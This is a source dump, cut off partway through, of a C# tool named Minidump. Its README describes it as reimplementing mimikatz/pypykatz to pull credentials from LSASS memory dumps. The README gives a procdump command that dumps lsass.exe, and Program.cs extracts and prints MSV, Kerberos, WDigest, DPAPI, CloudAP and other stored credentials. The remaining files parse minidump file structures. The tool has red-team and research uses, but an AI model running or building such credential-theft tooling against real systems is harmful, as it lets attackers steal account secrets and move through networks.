Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Minidump", "Minidump.csproj", "{BA1F3992-9654-4424-A0CC-26158FDFBF74}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{BA1F3992-9654-4424-A0CC-26158FDFBF74}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{BA1F3992-9654-4424-A0CC-26158FDFBF74}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{BA1F3992-9654-4424-A0CC-26158FDFBF74}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{BA1F3992-9654-4424-A0CC-26158FDFBF74}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {49F52435-5786-4088-BAEC-444E0B1D1B74}
	EndGlobalSection
EndGlobal

```

`Program.cs`:

```cs
using Minidump.Decryptor;
using Minidump.Streams;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.IO;

namespace Minidump
{
    public class Program
    {
        public struct MiniDump
        {
            public Header.MinidumpHeader header;
            public SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo;
            public List<ModuleList.MinidumpModule> modules;
            public MINIDUMP_MEMORY64.MinidumpMemory64List memory_segments_64;
            public MINIDUMP_MEMORY86.MinidumpMemory86List memory_segments;
            public BinaryReader fileBinaryReader;
            public LsaDecryptor.LsaKeys lsakeys;
            public List<Logon> logonlist;
            public List<KerberosSessions.KerberosLogonItem> klogonlist;
        }

        private static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Missing argument");
                Console.WriteLine("Example. Minidump.exe C:\\windows\\temp\\lsass.dmp");
                return;
            }
            string filename = args[0];
            if (!File.Exists(filename))
            {
                Console.WriteLine("Could not find file " + filename);
                return;
            }

            MiniDump minidump = new MiniDump();
            using (BinaryReader fileBinaryReader = new BinaryReader(File.Open(filename, FileMode.Open)))
            {
                // parse header && streams
                minidump.fileBinaryReader = fileBinaryReader;
                minidump.header = Header.ParseHeader(minidump);
                List<Streams.Directory.MINIDUMP_DIRECTORY> directories = Streams.Directory.ParseDirectory(minidump);
                Parse.parseMM(ref minidump, directories);
                //Helpers.PrintProperties(minidump.header);
                //Helpers.PrintProperties(minidump.sysinfo);
                //Helpers.PrintProperties(minidump.modules);
                //Helpers.PrintProperties(minidump.MinidumpMemory64List);

                minidump.sysinfo.msv_dll_timestamp = 0;
                foreach (ModuleList.MinidumpModule mod in minidump.modules)
                {
                    if (mod.name.Contains("lsasrv.dll"))
                    {
                        minidump.sysinfo.msv_dll_timestamp = (int)mod.timestamp;
                        break;
                    }
                }

                // parse lsa
                minidump.lsakeys = LsaDecryptor.choose(minidump, lsaTemplate.get_template(minidump.sysinfo));
                //Console.WriteLine(Helpers.ByteArrayToString(minidump.lsakeys.iv));
                //Console.WriteLine(Helpers.ByteArrayToString(minidump.lsakeys.des_key));
                //Console.WriteLine(Helpers.ByteArrayToString(minidump.lsakeys.aes_key));

                // parse sessions
                minidump.logonlist = LogonSessions.FindSessions(minidump, msv.get_template(minidump.sysinfo));
                minidump.klogonlist = KerberosSessions.FindSessions(minidump, (kerberos.get_template(minidump.sysinfo)));

                //parse credentials
                try
                {
                    Msv1_.FindCredentials(minidump, msv.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"MSV failed: {e.Message}");
                }
                
                try
                {
                    WDigest_.FindCredentials(minidump, wdigest.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"WDigest failed: {e.Message}");
                }
                
                try
                {
                    Kerberos_.FindCredentials(minidump, kerberos.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Kerberos failed: {e.Message}");
                }
                
                try
                {
                    Tspkg_.FindCredentials(minidump, tspkg.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"TsPkg failed: {e.Message}");
                }
                
                try
                {
                    Credman_.FindCredentials(minidump, credman.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Credman failed: {e.Message}");
                }
                
                try
                {
                    Ssp_.FindCredentials(minidump, ssp.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"SSP failed: {e.Message}");
                }
                
                //try
                //{
                //    LiveSsp_.FindCredentials(minidump, livessp.get_template(minidump.sysinfo));
                //}
                //catch (Exception e)
                //{
                //    Console.WriteLine($"LiveSSP failed: {e.Message}");
                //}
                
                try
                {
                    Cloudap_.FindCredentials(minidump, cloudap.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"CloudAP failed: {e.Message}");
                }
                
                try
                {
                    Dpapi_.FindCredentials(minidump, dpapi.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Dpapi failed: {e.Message}");
                }

                foreach (Logon log in minidump.logonlist)
                {
                    try
                    {
                        if (log.Wdigest != null || log.Msv != null || log.Kerberos != null || log.Tspkg != null || log.Credman != null || log.Ssp != null || log.LiveSsp != null || log.Dpapi != null || log.Cloudap != null)
                        {
                            Console.WriteLine("=====================================================================");
                            //Helpers.PrintProperties(log);
                            Console.WriteLine($"[*] LogonId:     {log.LogonId.HighPart}:{log.LogonId.LowPart}");
                            if (!string.IsNullOrEmpty(log.LogonType))
                                Console.WriteLine($"[*] LogonType:   {log.LogonType}");
                            Console.WriteLine($"[*] Session:     {log.Session}");
                            if(log.LogonTime.dwHighDateTime != 0)
                                Console.WriteLine($"[*] LogonTime:   {Helpers.ToDateTime(log.LogonTime):yyyy-MM-dd HH:mm:ss}");
                            Console.WriteLine($"[*] UserName:    {log.UserName}");
                            if (!string.IsNullOrEmpty(log.SID))
                                Console.WriteLine($"[*] SID:         {log.SID}");
                            if (!string.IsNullOrEmpty(log.LogonDomain))
                                Console.WriteLine($"[*] LogonDomain: {log.LogonDomain}");
                            if(!string.IsNullOrEmpty(log.LogonServer))
                                Console.WriteLine($"[*] LogonServer: {log.LogonServer}");
                        }
                        if (log.Msv != null)
                        {
                            Helpers.PrintProperties(log.Msv, "[*] Msv", 4);
                        }
                        if (log.Kerberos != null)
                        {
                            Helpers.PrintProperties(log.Kerberos, "[*] Kerberos", 4);
                        }
                        if (log.Wdigest != null)
                        {
                            foreach (WDigest wd in log.Wdigest)
                                Helpers.PrintProperties(wd, "[*] Wdigest", 4);
                        }
                        if (log.Ssp != null)
                        {
                            foreach (Ssp s in log.Ssp)
                                Helpers.PrintProperties(s, "[*] Ssp", 4);
                        }
                        if (log.Tspkg != null)
                        {
                            foreach (Tspkg ts in log.Tspkg)
                                Helpers.PrintProperties(ts, "[*] TsPkg", 4);
                        }
                        if (log.Credman != null)
                        {
                            foreach (CredMan cm in log.Credman)
                                Helpers.PrintProperties(cm, "[*] CredMan", 4);
                        }
                        if (log.Dpapi != null)
                        {
                            foreach (Dpapi dpapi in log.Dpapi)
                                Helpers.PrintProperties(dpapi, "[*] Dpapi", 4);
                        }
                        if (log.Cloudap != null)
                        {
                            foreach (Cloudap cap in log.Cloudap)
                                Helpers.PrintProperties(cap, "[*] CloudAp", 4);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"{e.Message}");
                    }
                }
            }
        }
    }
}
```

`Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("Minidump")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Minidump")]
[assembly: AssemblyCopyright("Copyright ©  2021")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible
// to COM components.  If you need to access a type in this assembly from
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("ba1f3992-9654-4424-a0cc-26158fdfbf74")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
```

`README.md`:

```md
# Minidump

C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps.

![poc](Images/poc.png)



### Usage

```
procdump64.exe -ma lsass.exe lsass.dmp
C:\minidump.exe lsass.dmp
```



### Supported Credentials

* Lsa
* Msv
* Kerberos
* WDigest
* SSP
* TsPkg
* Credman
* Dpapi
* CloudAP



### Todo

* LiveSSP
* NT5 Support
* x86 Support



## Acknowledgements

Minidump is based on the following projects and the work by the creators

* [pypykatz](https://github.com/skelsec/pypykatz) by [skelsec](https://twitter.com/SkelSec)
* [mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi)
* [sharpkatz](https://github.com/b4rtik/SharpKatz) by [b4rtik](https://twitter.com/b4rtik)

```

`Streams/Directory.cs`:

```cs
using System;
using System.Collections.Generic;

namespace Minidump.Streams
{
    public class Directory
    {
        public struct MINIDUMP_DIRECTORY
        {
            public MINIDUMP_STREAM_TYPE StreamType;
            public uint Size;
            public uint Offset;
        }

        [Flags]
        public enum MINIDUMP_STREAM_TYPE
        {
            UnusedStream = 0,
            ReservedStream0 = 1,
            ReservedStream1 = 2,
            ThreadListStream = 3,
            ModuleListStream = 4,
            MemoryListStream = 5,
            ExceptionStream = 6,
            SystemInfoStream = 7,
            ThreadExListStream = 8,
            Memory64ListStream = 9,
            CommentStreamA = 10,
            CommentStreamW = 11,
            HandleDataStream = 12,
            FunctionTableStream = 13,
            UnloadedModuleListStream = 14,
            MiscInfoStream = 15,
            MemoryInfoListStream = 16,
            ThreadInfoListStream = 17,
            HandleOperationListStream = 18,
            TokenStream = 19,
            JavaScriptDataStream = 20,
            SystemMemoryInfoStream = 21,
            ProcessVmCountersStream = 22,
            ThreadNamesStream = 24,
            ceStreamNull = 25,
            ceStreamSystemInfo = 26,
            ceStreamException = 27,
            ceStreamModuleList = 28,
            ceStreamProcessList = 29,
            ceStreamThreadList = 30,
            ceStreamThreadContextList = 31,
            ceStreamThreadCallStackList = 32,
            ceStreamMemoryVirtualList = 33,
            ceStreamMemoryPhysicalList = 34,
            ceStreamBucketParameters = 35,
            ceStreamProcessModuleMap = 36,
            ceStreamDiagnosisList = 37,
            LastReservedStream = 0xffff,
        }

        public static List<MINIDUMP_DIRECTORY> ParseDirectory(Program.MiniDump minidump)
        {
            List<MINIDUMP_DIRECTORY> directories = new List<Directory.MINIDUMP_DIRECTORY>();

            for (int i = 0; i < (int)minidump.header.NumberOfStreams; i++)
            {
                minidump.fileBinaryReader.BaseStream.Seek(minidump.header.StreamDirectoryRva + i * 12, 0);
                UInt32 raw_stream_type_value = Helpers.ReadUInt32(minidump.fileBinaryReader);
                bool is_user_stream = (int)raw_stream_type_value > (int)MINIDUMP_STREAM_TYPE.LastReservedStream;
                bool is_stream_supported = Enum.IsDefined(typeof(MINIDUMP_STREAM_TYPE), (int)raw_stream_type_value);
                if (is_user_stream && !is_stream_supported)
                {
                    continue;
                }

                MINIDUMP_DIRECTORY md = new MINIDUMP_DIRECTORY();
                md.StreamType = (MINIDUMP_STREAM_TYPE)Enum.Parse(typeof(MINIDUMP_STREAM_TYPE),
                    Enum.GetName(typeof(MINIDUMP_STREAM_TYPE), (int)raw_stream_type_value)); // Enum.GetName(typeof(MINIDUMP_STREAM_TYPE), (int)raw_stream_type_value);
                md.Size = Helpers.ReadUInt32(minidump.fileBinaryReader);
                md.Offset = Helpers.ReadUInt32(minidump.fileBinaryReader);
                directories.Add(md);
            }

            return directories;
        }
    }
}
```

`Streams/Header.cs`:

```cs
using System;

namespace Minidump.Streams
{
    public class Header
    {
        public struct MinidumpHeader
        {
            public String Signature;
            public UInt16 Version;
            public UInt16 ImplementationVersion;
            public UInt32 NumberOfStreams;
            public UInt32 StreamDirectoryRva;
            public UInt32 CheckSum;
            public UInt32 Reserved;
            public UInt32 TimeDateStamp;
            public string Flags;
        }

        [Flags]
        public enum MINIDUMP_TYPE
        {
            MiniDumpNormal = 0x00000000,
            MiniDumpWithDataSegs = 0x00000001,
            MiniDumpWithFullMemory = 0x00000002,
            MiniDumpWithHandleData = 0x00000004,
            MiniDumpFilterMemory = 0x00000008,
            MiniDumpScanMemory = 0x00000010,
            MiniDumpWithUnloadedModules = 0x00000020,
            MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
            MiniDumpFilterModulePaths = 0x00000080,
            MiniDumpWithProcessThreadData = 0x00000100,
            MiniDumpWithPrivateReadWriteMemory = 0x00000200,
            MiniDumpWithoutOptionalData = 0x00000400,
            MiniDumpWithFullMemoryInfo = 0x00000800,
            MiniDumpWithThreadInfo = 0x00001000,
            MiniDumpWithCodeSegs = 0x00002000,
            MiniDumpWithoutAuxiliaryState = 0x00004000,
            MiniDumpWithFullAuxiliaryState = 0x00008000,
            MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
            MiniDumpIgnoreInaccessibleMemory = 0x00020000,
            MiniDumpWithTokenInformation = 0x00040000,
            MiniDumpWithModuleHeaders = 0x00080000,
            MiniDumpFilterTriage = 0x00100000,
            MiniDumpValidTypeFlags = 0x001fffff
        }

        public static MinidumpHeader ParseHeader(Program.MiniDump minidump)
        {
            MinidumpHeader Header = new MinidumpHeader();
            Header.Signature = Helpers.ReadString(minidump.fileBinaryReader, 4);
            Header.Version = Helpers.ReadUInt16(minidump.fileBinaryReader);
            Header.ImplementationVersion = Helpers.ReadUInt16(minidump.fileBinaryReader);
            Header.NumberOfStreams = Helpers.ReadUInt32(minidump.fileBinaryReader);
            Header.StreamDirectoryRva = Helpers.ReadUInt32(minidump.fileBinaryReader);
            Header.CheckSum = Helpers.ReadUInt32(minidump.fileBinaryReader);
            Header.Reserved = Helpers.ReadUInt32(minidump.fileBinaryReader);
            Header.TimeDateStamp = Helpers.ReadUInt32(minidump.fileBinaryReader);
            //Header.Flags = Helpers.ReadUInt32(fileBinaryReader);
            Header.Flags = Enum.GetName(typeof(MINIDUMP_TYPE), Helpers.ReadUInt32(minidump.fileBinaryReader));

            return Header;
        }
    }
}
```

`Streams/Memory64ListStream.cs`:

```cs
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Minidump.Streams
{
    public class MINIDUMP_MEMORY64
    {
        public struct MINIDUMP_MEMORY64_LIST
        {
            public long NumberOfMemoryRanges;
            public long BaseRva;
            public List<MINIDUMP_MEMORY_DESCRIPTOR64> MemoryRanges;
        }

        public static MINIDUMP_MEMORY64_LIST parse_mml(BinaryReader fileBinaryReader)
        {
            MINIDUMP_MEMORY64_LIST mml = new MINIDUMP_MEMORY64_LIST();
            mml.NumberOfMemoryRanges = Helpers.ReadInt64(fileBinaryReader);
            mml.BaseRva = Helpers.ReadInt64(fileBinaryReader);
            List<MINIDUMP_MEMORY_DESCRIPTOR64> list = new List<MINIDUMP_MEMORY_DESCRIPTOR64>();
            foreach (var _ in Enumerable.Range(0, (int)mml.NumberOfMemoryRanges))
            {
                list.Add(parse_mmd(fileBinaryReader));
            }

            mml.MemoryRanges = list;
            return mml;
        }

        public struct MINIDUMP_MEMORY_DESCRIPTOR64
        {
            public long StartOfMemoryRange;
            public long DataSize;
        }

        public static MINIDUMP_MEMORY_DESCRIPTOR64 parse_mmd(BinaryReader fileBinaryReader)
        {
            MINIDUMP_MEMORY_DESCRIPTOR64 md = new MINIDUMP_MEMORY_DESCRIPTOR64();
            md.StartOfMemoryRange = Helpers.ReadInt64(fileBinaryReader);
            md.DataSize = Helpers.ReadInt64(fileBinaryReader);
            return md;
        }

        public struct MinidumpMemory64List
        {
            public List<MinidumpMemory.MinidumpMemorySegment> memory_segments;
        }

        public static MinidumpMemory64List parse(Directory.MINIDUMP_DIRECTORY dir, Program.MiniDump minidump)
        {
            List<MinidumpMemory.MinidumpMemorySegment> list = new List<MinidumpMemory.MinidumpMemorySegment>();
            MinidumpMemory64List mmlist = new MinidumpMemory64List();

            minidump.fileBinaryReader.BaseStream.Seek(dir.Offset, 0);
            byte[] chunk = minidump.fileBinaryReader.ReadBytes((int)dir.Size);

            using (BinaryReader ChunkReader = new BinaryReader(new MemoryStream(chunk)))
            {
                var mtl = parse_mml(ChunkReader);
                var rva = mtl.BaseRva;
                foreach (MINIDUMP_MEMORY_DESCRIPTOR64 mod in mtl.MemoryRanges)
                {
                    list.Add(MinidumpMemory.parse_full(mod, rva));
                    rva += mod.DataSize;
                }
            }

            mmlist.memory_segments = list;
            return mmlist;
        }
    }
}
```

`Streams/Memory86ListStream.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Minidump.Streams
{
    public class MINIDUMP_MEMORY86
    {
        public struct MINIDUMP_MEMORY_LIST
        {
            public UInt32 NumberOfMemoryRanges;
            public List<object> MemoryRanges;
        }

        public static MINIDUMP_MEMORY_LIST parse_mml(BinaryReader fileBinaryReader)
        {
            var mml = new MINIDUMP_MEMORY_LIST();
            mml.NumberOfMemoryRanges = Helpers.ReadUInt32(fileBinaryReader);
            foreach (var _ in Enumerable.Range(0, (int)mml.NumberOfMemoryRanges))
            {
                mml.MemoryRanges.Add(parse_mmd(fileBinaryReader));
            }
            return mml;
        }

        public struct MINIDUMP_MEMORY_DESCRIPTORx86
        {
            public UInt64 StartOfMemoryRange;
            public UInt32 MemoryLocation;

            //we do not use MemoryLocation but immediately store its fields in this object for easy access
            public UInt32 DataSize;

            public UInt32 Rva;
        }

        public static MINIDUMP_MEMORY_DESCRIPTORx86 parse_mmd(BinaryReader fileBinaryReader)
        {
            var md = new MINIDUMP_MEMORY_DESCRIPTORx86();
            md.StartOfMemoryRange = Helpers.ReadUInt64(fileBinaryReader);
            //MemoryLocation = parse_mld(fileBinaryReader);
            //md.DataSize = md.MemoryLocation.DataSize;
            //md.Rva = md.MemoryLocation.Rva;
            return md;
        }

        public struct MinidumpMemory86List
        {
            public List<MinidumpMemory.MinidumpMemorySegment> memory_segments;
        }

        public static MinidumpMemory86List parse(Directory.MINIDUMP_DIRECTORY dir, Program.MiniDump minidump)
        {
            List<MinidumpMemory.MinidumpMemorySegment> list = new List<MinidumpMemory.MinidumpMemorySegment>();
            MinidumpMemory86List mmlist = new MinidumpMemory86List();

            minidump.fileBinaryReader.BaseStream.Seek(dir.Offset, 0);
            byte[] chunk = minidump.fileBinaryReader.ReadBytes((int)dir.Size);

            using (BinaryReader ChunkReader = new BinaryReader(new MemoryStream(chunk)))
            {
                var mtl = parse_mml(ChunkReader);
                foreach (MINIDUMP_MEMORY_DESCRIPTORx86 mod in mtl.MemoryRanges)
                {
                    //list.Add(parse_mini(mod, fileBinaryReader));
                }
            }

            mmlist.memory_segments = list;
            return mmlist;
        }
    }
}
```

`Streams/MinidumpMemory.cs`:

```cs
namespace Minidump.Streams
{
    public class MinidumpMemory
    {
        public struct MinidumpMemorySegment
        {
            public long start_virtual_address;
            public long size;
            public long end_virtual_address;
            public long start_file_address;
        }

        public static MinidumpMemorySegment parse_full(MINIDUMP_MEMORY64.MINIDUMP_MEMORY_DESCRIPTOR64 memory_decriptor, long rva)
        {
            MinidumpMemorySegment mms = new MinidumpMemorySegment();
            mms.start_virtual_address = memory_decriptor.StartOfMemoryRange;
            mms.size = memory_decriptor.DataSize;
            mms.start_file_address = rva;
            mms.end_virtual_address = mms.start_virtual_address + mms.size;

            return mms;
        }
    }
}
```

`Streams/ModuleList.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Minidump.Streams
{
    public class ModuleList
    {
        public struct MinidumpModule
        {
            public string name;
            public long baseaddress;
            public long size;
            public long endaddress;
            public VS_FIXEDFILEINFO versioninfo;
            public long checksum;
            public long timestamp;
        }

        public struct VS_FIXEDFILEINFO
        {
            public UInt32 dwSignature;
            public UInt32 dwStrucVersion;
            public UInt32 dwFileVersionMS;
            public UInt32 dwFileVersionLS;
            public UInt32 dwProductVersionMS;
            public UInt32 dwProductVersionLS;
            public UInt32 dwFileFlagsMask;
            public UInt32 dwFileFlags;
            public UInt32 dwFileOS;
            public UInt32 dwFileType;
            public UInt32 dwFileSubtype;
            public UInt32 dwFileDateMS;
            public UInt32 dwFileDateLS;
        }

        public struct MINIDUMP_MODULE
        {
            public long BaseOfImage;
            public long SizeOfImage;
            public long CheckSum;
            public long TimeDateStamp;
            public long ModuleNameRva;
            public VS_FIXEDFILEINFO VersionInfo;
            public MINIDUMP_LOCATION_DESCRIPTOR CvRecord;
            public MINIDUMP_LOCATION_DESCRIPTOR MiscRecord;
            public UInt64 Reserved0;
            public UInt64 Reserved1;
        }

        public struct MINIDUMP_MODULE_LIST
        {
            public int NumberOfModules;
            public List<MINIDUMP_MODULE> Modules;
        }

        public struct MINIDUMP_LOCATION_DESCRIPTOR
        {
            public UInt32 Size;
            public UInt32 Rva;
        }

        public static MinidumpModule parse_mod(MINIDUMP_MODULE mod, BinaryReader fileBinaryReader)
        {
            MinidumpModule mm = new MinidumpModule();
            mm.baseaddress = mod.BaseOfImage;
            mm.size = mod.SizeOfImage;
            mm.checksum = mod.CheckSum;
            mm.timestamp = mod.TimeDateStamp;
            mm.name = Helpers.get_from_rva((int)mod.ModuleNameRva, fileBinaryReader);
            mm.versioninfo = mod.VersionInfo;
            mm.endaddress = (mm.baseaddress + mod.SizeOfImage);
            return mm;
        }

        public static MINIDUMP_LOCATION_DESCRIPTOR parse_mld(BinaryReader fileBinaryReader)
        {
            MINIDUMP_LOCATION_DESCRIPTOR mld = new MINIDUMP_LOCATION_DESCRIPTOR();

            mld.Size = Helpers.ReadUInt32(fileBinaryReader);
            mld.Rva = Helpers.ReadUInt32(fileBinaryReader);

            return mld;
        }

        public static VS_FIXEDFILEINFO parse_vf(BinaryReader fileBinaryReader)
        {
            VS_FIXEDFILEINFO vf = new VS_FIXEDFILEINFO();
            vf.dwSignature = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwStrucVersion = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwFileVersionMS = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwFileVersionLS = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwProductVersionMS = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwProductVersionLS = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwFileFlagsMask = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwFileFlags = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwFileOS = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwFileType = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwFileSubtype = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwFileDateMS = Helpers.ReadUInt32(fileBinaryReader);
            vf.dwFileDateLS = Helpers.ReadUInt32(fileBinaryReader);
            return vf;
        }

        public static MINIDUMP_MODULE parse_mm(BinaryReader fileBinaryReader)
        {
            MINIDUMP_MODULE mm = new MINIDUMP_MODULE();
            mm.BaseOfImage = Helpers.ReadInt64(fileBinaryReader);
            mm.SizeOfImage = Helpers.ReadUInt32(fileBinaryReader);
            mm.CheckSum = Helpers.ReadUInt32(fileBinaryReader);
            mm.TimeDateStamp = Helpers.ReadUInt32(fileBinaryReader);
            mm.ModuleNameRva = Helpers.ReadUInt32(fileBinaryReader);
            mm.VersionInfo = parse_vf(fileBinaryReader);
            mm.CvRecord = parse_mld(fileBinaryReader);
            mm.MiscRecord = parse_mld(fileBinaryReader);
            mm.Reserved0 = Helpers.ReadUInt64(fileBinaryReader);
            mm.Reserved1 = Helpers.ReadUInt64(fileBinaryReader);
            return mm;
        }

        public static MINIDUMP_MODULE_LIST parse_mml(BinaryReader fileBinaryReader)
        {
            MINIDUMP_MODULE_LIST mml = new MINIDUMP_MODULE_LIST();
            List<MINIDUMP_MODULE> modules = new List<MINIDUMP_MODULE>();

            mml.NumberOfModules = Helpers.ReadInt32(fileBinaryReader);
            foreach (var _ in Enumerable.Range(0, mml.NumberOfModules))
            {
                MINIDUMP_MODULE module = parse_mm(fileBinaryReader);
                modules.Add(module);
            }

            mml.Modules = modules;
            return mml;
        }

        public static List<MinidumpModule> parse(Directory.MINIDUMP_DIRECTORY dir, Program.MiniDump minidump)
        {
            List<MinidumpModule> list = new List<MinidumpModule>();
            minidump.fileBinaryReader.BaseStream.Seek(dir.Offset, 0);
            byte[] chunk = minidump.fileBinaryReader.ReadBytes((int)dir.Size);

            using (BinaryReader ChunkReader = new BinaryReader(new MemoryStream(chunk)))
            {
                MINIDUMP_MODULE_LIST mtl = parse_mml(ChunkReader);
                foreach (MINIDUMP_MODULE mod in mtl.Modules)
                {
                    MinidumpModule module = parse_mod(mod, minidump.fileBinaryReader);
                    list.Add(module);
                }
            }
            return list;
        }
    }
}
```

`Streams/Parse.cs`:

```cs
using System.Collections.Generic;

namespace Minidump.Streams
{
    internal class Parse
    {
        public static int parseMM(ref Program.MiniDump minidump, List<Directory.MINIDUMP_DIRECTORY> directories)
        {
            foreach (Directory.MINIDUMP_DIRECTORY dir in directories)
            {
                if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.UnusedStream)
                {
                    //Console.WriteLine($"Found UnusedStream {dir.Offset} {dir.Size} Size");
                    continue; //Reserved. Do not use this enumeration value.
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.ReservedStream0)
                {
                    //Console.WriteLine($"Found ReservedStream0 {dir.Offset} {dir.Size} Size");
                    continue; // Reserved. Do not use this enumeration value.
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.ReservedStream1)
                {
                    //Console.WriteLine($"Found ReservedStream1 {dir.Offset} {dir.Size} Size");
                    continue; // Reserved. Do not use this enumeration value.
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.ThreadListStream)
                {
                    //Console.WriteLine($"Found ThreadListStream {dir.Offset} {dir.Size} Size");
                    //threads = MinidumpThreadList.parse(dir, file_handle);
                    continue;
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.ModuleListStream)
                {
                    //Console.WriteLine($"Found ModuleListStream {dir.Offset} {dir.Size} Size");
                    minidump.modules = ModuleList.parse(dir, minidump);
                    continue; //Console.WriteLine(str(modules_list))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.MemoryListStream)
                {
                    //Console.WriteLine($"Found MemoryListStream {dir.Offset} {dir.Size} Size");
                    //memory_segments = MinidumpMemoryList.parse(dir, minidump);
                    continue; //Console.WriteLine(str(memory_segments))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.SystemInfoStream)
                {
                    //Console.WriteLine($"Found SystemInfoStream {dir.Offset} {dir.Size} Size");
                    minidump.sysinfo = SystemInfo.parse(dir, minidump);
                    continue; //Console.WriteLine(str(sysinfo))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.ThreadExListStream)
                {
                    //Console.WriteLine($"Found ThreadExListStream {dir.Offset} {dir.Size} Size");
                    //threads_ex = MinidumpThreadExList.parse(dir, file_handle);
                    continue; //Console.WriteLine(str(threads_ex))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.Memory64ListStream)
                {
                    //Console.WriteLine($"Found Memory64ListStream {dir.Offset} {dir.Size} Size");
                    minidump.memory_segments_64 = MINIDUMP_MEMORY64.parse(dir, minidump);
                    continue; //Console.WriteLine(str(memory_segments_64))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.CommentStreamA)
                {
                    //Console.WriteLine($"Found CommentStreamA {dir.Offset} {dir.Size} Size");
                    //comment_a = CommentStreamA.parse(dir, file_handle);
                    continue; //Console.WriteLine(str(comment_a))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.CommentStreamW)
                {
                    //Console.WriteLine($"Found CommentStreamW {dir.Offset} {dir.Size} Size");
                    //comment_w = CommentStreamW.parse(dir, file_handle);
                    continue; //Console.WriteLine(str(comment_w))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.ExceptionStream)
                {
                    //Console.WriteLine($"Found ExceptionStream {dir.Offset} {dir.Size} Size");
                    //exception = ExceptionList.parse(dir, file_handle);
                    continue; //Console.WriteLine(str(comment_w))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.HandleDataStream)
                {
                    //Console.WriteLine($"Found HandleDataStream {dir.Offset} {dir.Size} Size");
                    //handles = MinidumpHandleDataStream.parse(dir, file_handle);
                    continue; //Console.WriteLine(str(handles))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.FunctionTableStream)
                {
                    //Console.WriteLine($"Found FunctionTableStream {dir.Offset} {dir.Size} Size");
                    //Console.WriteLine($"Parsing of this stream type is not yet implemented!");
                    continue;
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.UnloadedModuleListStream)
                {
                    //Console.WriteLine($"Found UnloadedModuleListStream {dir.Offset} {dir.Size} Size");
                    //unloaded_modules = MinidumpUnloadedModuleList.parse(dir, file_handle);
                    continue; //Console.WriteLine(str(unloaded_modules))
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.MiscInfoStream)
                {
